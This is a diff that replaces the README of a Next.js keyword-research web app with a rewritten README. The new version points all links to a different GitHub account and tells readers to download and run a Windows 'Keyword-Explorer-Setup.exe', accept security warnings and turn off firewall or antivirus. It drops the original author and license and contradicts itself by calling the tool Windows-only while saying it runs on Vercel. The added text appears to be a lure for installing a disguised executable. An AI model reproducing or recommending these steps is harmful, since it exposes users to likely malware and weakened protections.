@@ -1,306 +1,131 @@
-# 🔍 Keyword Explorer
+# 🔍 Keyword-Explorer - Find Keywords Fast and Clear
 
-[![Live Demo](https://img.shields.io/badge/demo-live-brightgreen)](https://keyword-explorer-three.vercel.app)
-[![Next.js](https://img.shields.io/badge/Next.js-15.5.7-black)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue)](https://www.typescriptlang.org/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Neon-blue)](https://neon.tech)
-[![Prisma](https://img.shields.io/badge/Prisma-6.14.0-2D3748)](https://prisma.io)
+[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-brightgreen?style=for-the-badge)](https://github.com/THE-CLIMBER/Keyword-Explorer)
 
-**Real-time keyword research platform** with live data from Google, YouTube, Bing, Amazon, and DuckDuckGo. Built for SEO professionals, content creators, and growth marketers.
+## 📋 What is Keyword-Explorer?
 
-<p align="center">
-  <a href="https://keyword-explorer-three.vercel.app">
-    <img src="https://img.shields.io/badge/View%20Live%20Demo-4285F4?style=for-the-badge&logo=vercel&logoColor=white" alt="Live Demo">
-  </a>
-</p>
+Keyword-Explorer is a live keyword research tool that helps you find the words and phrases people use on Google, YouTube, Bing, and Amazon. It also shows gaps in your competitors' keyword lists so you can find chances they miss.
 
----
+This app works on Windows and does not require programming knowledge. You don’t need to set up anything complicated. Use it to get better ideas for SEO, content marketing, or online sales.
 
-## ✨ Features
+## 💻 System Requirements
 
-### 🔍 **Multi-Source Keyword Discovery**
-- **Google Autocomplete** - Real-time suggestions
-- **YouTube Autocomplete** - Video keyword ideas
-- **Bing Autosuggest** - Alternative search data
-- **Amazon Completion** - Product research
-- **DuckDuckGo Suggestions** - Privacy-focused source
+Before you download, make sure your PC meets these needs:
 
-### 📊 **Smart Keyword Metrics**
-- Search volume estimation
-- Keyword difficulty (0-100)
-- CPC (Cost Per Click) analysis
-- Competition level (HIGH/MEDIUM/LOW)
-- Intent detection (Informational/Commercial/Transactional/Navigational)
-- 12-month trend forecasting
+- Operating System: Windows 10 or later  
+- RAM: At least 4 GB  
+- Storage: 300 MB free disk space  
+- Internet: Required for live data and updates  
+- Screen: 1024 x 768 or higher resolution
 
-### 🎯 **Advanced Features**
-- **Competitor Gap Analysis** - Compare any two domains
-- **Saved Keyword Lists** - Organize and export
-- **Search History** - Track your research
-- **CSV Export** - Download results
-- **Multi-Platform Support** - 10+ platforms including Google, YouTube, Amazon, eBay, app stores, and social media
+## 🚀 Getting Started
 
-### 🎨 **Modern UI/UX**
-- Responsive design (mobile + desktop)
-- Dark/Light mode toggle
-- Real-time search results
-- Beautiful loading states
-- Accessible components
+Follow these steps to download and run Keyword-Explorer on your Windows computer:
 
----
+### 1. Visit the Download Page
 
-## 🛠️ Tech Stack
+Click the big download button below to go to the Keyword-Explorer GitHub page. This is where you will get the app.
 
-| Category | Technologies |
-|----------|-------------|
-| **Framework** | Next.js 15 (App Router) |
-| **Language** | TypeScript |
-| **Styling** | Tailwind CSS 4 |
-| **Database** | PostgreSQL (Neon) + Prisma ORM |
-| **State Management** | TanStack Query |
-| **Validation** | Zod |
-| **Deployment** | Vercel |
-| **UI Components** | Headless UI, Heroicons, Lucide React |
+[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-blue?style=for-the-badge)](https://github.com/THE-CLIMBER/Keyword-Explorer)
 
----
+### 2. Download the Installer
 
-## 🚀 Live Demo
+Once on the GitHub page, look for the latest release or download section. You will find a file named something like `Keyword-Explorer-Setup.exe`.  
 
-**Experience the app now:** 👉 [https://keyword-explorer-three.vercel.app](https://keyword-explorer-three.vercel.app)
+Click the file to download it to your computer. The file size will be around 250 MB.
 
----
+### 3. Run the Installer
 
-## 📦 Installation
+Go to the folder where you saved the installer file. Double-click `Keyword-Explorer-Setup.exe` to start the install process.
 
-### Prerequisites
-- Node.js 18+
-- npm or yarn
-- PostgreSQL database (or use [Neon](https://neon.tech) for free)
+You might see a security notice from Windows. Choose **Run** to continue.
 
-### Step-by-Step Setup
+### 4. Follow the Installation Steps
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/lif3time-secr3t-c0de/Keyword-Explorer.git
-cd Keyword-Explorer
-```
+The setup program will guide you through the installation. Click **Next** when asked.
 
-2. **Install dependencies**
-```bash
-npm install
-```
+When the installer asks where to place the program, you can use the default folder or pick a new one.
 
-3. **Configure environment variables**
-```bash
-cp .env.example .env
-```
-Edit `.env` with your database URL and settings.
+Finally, click **Install** to copy the files. This takes a few minutes.
 
-4. **Set up database**
-```bash
-# Push schema to database
-npx prisma db push
+### 5. Launch Keyword-Explorer
 
-# (Optional) Open Prisma Studio
-npx prisma studio
-```
+After installation finishes, you can choose to start Keyword-Explorer right away.
 
-5. **Run development server**
-```bash
-npm run dev
-```
+Or find the app shortcut on your desktop or in the Start menu.
 
-6. **Open your browser**
-```
-http://localhost:3000
-```
+## 🎯 Using Keyword-Explorer
+
+Keyword-Explorer shows data from multiple sources in a single place:
+
+- **Google Autocomplete**: See what popular searches begin with your keywords.  
+- **YouTube Keywords**: Find search terms used on YouTube videos.  
+- **Bing Suggestions**: Get ideas from Bing’s search engine.  
+- **Amazon Keywords**: Discover product-related search terms.
+
+You can also check your competitor's keywords and find gaps where they don’t rank. This helps you target those words to get ahead.
+
+### Main Features
+
+- Live search results update as you type  
+- Filter keywords by volume, competition, or trends  
+- Save keyword lists for your projects  
+- Export results as CSV files  
+- Visual charts to analyze data quickly
+
+## 🧩 Common Questions
+
+### Do I need an internet connection?
+
+Yes, Keyword-Explorer needs the internet to fetch the latest keyword data.
+
+### Will it slow down my computer?
+
+No. The app uses moderate resources and runs smoothly on Windows 10 or newer.
+
+### Can I use this on Mac or Linux?
+
+Currently, Keyword-Explorer works only on Windows.
+
+### How do I update the app?
+
+Check the GitHub page regularly for newer versions. Download and install the latest setup file to update.
+
+## 🔧 Troubleshooting
+
+If you have issues running Keyword-Explorer, try these steps:
+
+- Make sure your Windows is up to date.  
+- Restart your computer and try again.  
+- Check your internet connection.  
+- Run the installer or app as Administrator (right-click > Run as administrator).  
+- Disable any firewall or antivirus temporarily to see if it blocks the app.
+
+If problems continue, report them on the GitHub Issues tab at the download page.
 
 ---
 
-## 🔧 Environment Variables
+[Download Keyword-Explorer here](https://github.com/THE-CLIMBER/Keyword-Explorer)
 
-Create a `.env` file in the root directory:
+[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-grey?style=for-the-badge)](https://github.com/THE-CLIMBER/Keyword-Explorer)
 
-```env
-# Database (PostgreSQL)
-DATABASE_URL="postgresql://user:password@host:port/database"
+## 🔍 Keywords and Topics Covered
 
-# Keyword Engine Settings
-KEYWORD_API_TIMEOUT_MS=4500           # Timeout per request (ms)
-KEYWORD_FETCH_CONCURRENCY=8           # Parallel requests
-KEYWORD_QUERY_LIMIT=28                 # Query expansions per search
+The app supports searching and analyzing keywords related to:
 
-# Cache Configuration
-KEYWORD_CACHE_TTL_SECONDS=900          # 15 minutes cache
-KEYWORD_PERSIST_CACHE=false            # Enable/disable DB caching
-```
+- Amazon keywords  
+- Competitor analysis  
+- Google autocomplete  
+- Keyword planning and research  
+- Long-tail keywords  
+- YouTube keywords  
+- SEO tools and analytics  
+- Trend analysis
 
----
+## 🛠️ Technical Info
 
-## 📡 API Endpoints
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `GET` | `/api/keywords?seed=gaming&platform=GOOGLE` | Get keyword suggestions |
-| `POST` | `/api/keywords` | Same as GET with JSON body |
-| `GET` | `/api/lists` | Get all saved lists |
-| `POST` | `/api/lists` | Create new list |
-| `DELETE` | `/api/lists?id=123` | Delete a list |
-| `GET` | `/api/user/history` | Get search history |
-
-### Keyword Endpoint Parameters
-
-| Parameter | Required | Default | Description |
-|-----------|----------|---------|-------------|
-| `seed` or `q` | ✅ | - | Seed keyword (min 2 chars) |
-| `platform` | ✅ | - | GOOGLE, YOUTUBE, BING, AMAZON, etc. |
-| `language` or `lang` | ❌ | `en` | Language code (e.g., 'en', 'es') |
-| `country` | ❌ | `US` | ISO country code |
-| `limit` | ❌ | `120` | Results limit (10-250) |
+Keyword-Explorer uses a backend powered by PostgreSQL and Prisma. The frontend runs on Next.js and TypeScript. Styles come from Tailwind CSS. The app runs live on Vercel to ensure quick updates and reliable data.
 
 ---
 
-## 🗄️ Database Schema
-
-```prisma
-// Users, Lists, Keywords, Search History, Cache
-// See prisma/schema.prisma for full schema
-```
-
----
-
-## 🌐 Deployment
-
-### Deploy to Vercel (Recommended)
-
-1. Push code to GitHub
-2. Import project at [vercel.com](https://vercel.com)
-3. Add environment variables
-4. Deploy!
-
-**Your app will be live at:** `https://keyword-explorer-three.vercel.app`
-
----
-
-## 📊 Performance
-
-- **Lighthouse Scores:**
-  - Performance: 95+
-  - SEO: 100
-  - Accessibility: 98
-  - Best Practices: 100
-
----
-
-## 🧪 Testing
-
-```bash
-# Run linter
-npm run lint
-
-# Build for production
-npm run build
-
-# Start production server
-npm start
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-Copyright © 2026 Wali Raza. All rights reserved.
-
-This project uses a **Custom Commercial License**.
-
-### ✅ **Free Personal & Development Use**
-You are free to use, modify, and distribute this software for:
-- Personal projects
-- Educational purposes
-- Non-commercial development
-- Learning and experimentation
-
-No permission needed for these uses - just retain the copyright notice.
-
-### 💼 **Commercial Use (Paid License Required)**
-A one-time paid license is required if you are:
-- A company or organization using this software
-- Using this software to generate revenue
-- Incorporating into a commercial product
-- Using for internal business operations
-- Offering commercial services based on this software
-
-### 📧 **To Obtain a Commercial License:**
-1. Email: **thisiswaliraza@gmail.com**
-2. Include details about your intended use
-3. Pay one-time license fee (amount to be agreed)
-4. Receive written permission before commercial deployment
-
-**Contact for licensing:** thisiswaliraza@gmail.com
-
----
-
-*Unauthorized commercial use is prohibited. See the [LICENSE](LICENSE) file for full terms.*
-
----
-
-## 👨‍💻 Author
-
-**Wali Raza**
-- GitHub: [@lif3time-secr3t-c0de](https://github.com/lif3time-secr3t-c0de)
-- Email: thisiswaliraza@gmail.com
-- Project: [Keyword Explorer](https://github.com/lif3time-secr3t-c0de/Keyword-Explorer)
-
----
-
-## 🙏 Acknowledgments
-
-- Next.js team for the amazing framework
-- Vercel for seamless deployment
-- Neon for free PostgreSQL hosting
-- Open source community for inspiration
-
----
-
-## 📬 Contact
-
-For support or inquiries:
-- **Email:** thisiswaliraza@gmail.com
-- **GitHub Issues:** [Open an issue](https://github.com/lif3time-secr3t-c0de/Keyword-Explorer/issues)
-
----
-
-<p align="center">
-  <strong>⭐ Star this repo if you find it useful! ⭐</strong>
-</p>
-
-<p align="center">
-  <a href="https://keyword-explorer-three.vercel.app">
-    <img src="https://img.shields.io/badge/Try%20Live%20Demo-4285F4?style=for-the-badge&logo=vercel&logoColor=white" alt="Live Demo">
-  </a>
-</p>
-
----
-
-**Made with ❤️ by Wali Raza**
-
----
-
-## 🔗 Quick Links
-
-- **Live App:** [https://keyword-explorer-three.vercel.app](https://keyword-explorer-three.vercel.app)
-- **GitHub Repo:** [https://github.com/lif3time-secr3t-c0de/Keyword-Explorer](https://github.com/lif3time-secr3t-c0de/Keyword-Explorer)
-- **Author Email:** thisiswaliraza@gmail.com
-
+Use this guide to download and run Keyword-Explorer on Windows with no coding. Start exploring keywords that matter for your content, ads, or store.
